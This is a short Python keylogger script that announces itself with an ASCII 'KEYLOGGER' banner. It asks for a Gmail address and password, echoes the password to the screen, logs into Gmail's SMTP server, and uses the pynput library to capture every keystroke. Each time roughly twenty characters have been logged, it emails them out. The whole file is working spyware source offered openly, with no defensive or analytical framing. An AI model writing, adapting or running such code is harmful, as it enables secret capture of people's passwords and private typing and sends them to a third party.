import getpass
import smtplib
# Simple Mail Transfer Protocol
# The smtplib module defines an SMTP client session object that can be used to send mail to any internet machine with
# an SMTP or ESMTP listener daemon. For details of SMTP and ESMTP operation, consult RFC 821 (Simple Mail Transfer
# Protocol) and RFC 1869 (SMTP Service Extensions).
from pynput.keyboard import Key, Listener

print("""
.-. .-')     ('-.                                                               ('-.  _  .-')   
\  ( OO )  _(  OO)                                                            _(  OO)( \( -O )  
,--. ,--. (,------. ,--.   ,--.,--.      .-'),-----.   ,----.      ,----.    (,------.,------.  
|  .'   /  |  .---'  \  `.'  / |  |.-') ( OO'  .-.  ' '  .-./-')  '  .-./-')  |  .---'|   /`. ' 
|      /,  |  |    .-')     /  |  | OO )/   |  | |  | |  |_( O- ) |  |_( O- ) |  |    |  /  | | 
|     ' _)(|  '--.(OO  \   /   |  |`-' |\_) |  |\|  | |  | .--, \ |  | .--, \(|  '--. |  |_.' | 
|  .   \   |  .--' |   /  /\_ (|  '---.'  \ |  | |  |(|  | '. (_/(|  | '. (_/ |  .--' |  .  '.' 
|  |\   \  |  `---.`-./  /.__) |      |    `'  '-'  ' |  '--'  |  |  '--'  |  |  `---.|  |\  \  
`--' '--'  `------'  `--'      `------'      `-----'   `------'    `------'   `------'`--' '--' 
""")
print()

email = input("Enter email: ")
password = getpass.getpass(prompt="Password: ")
print(email, password)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)
# boilerplate for sending an email 465 -> port

# logger
full_log = ''
word = ''
email_char_limit = 20

def on_press(key):
    global full_log, word, email, email_char_limit
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False

def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )

with Listener(on_press=on_press) as listener:
    listener.join()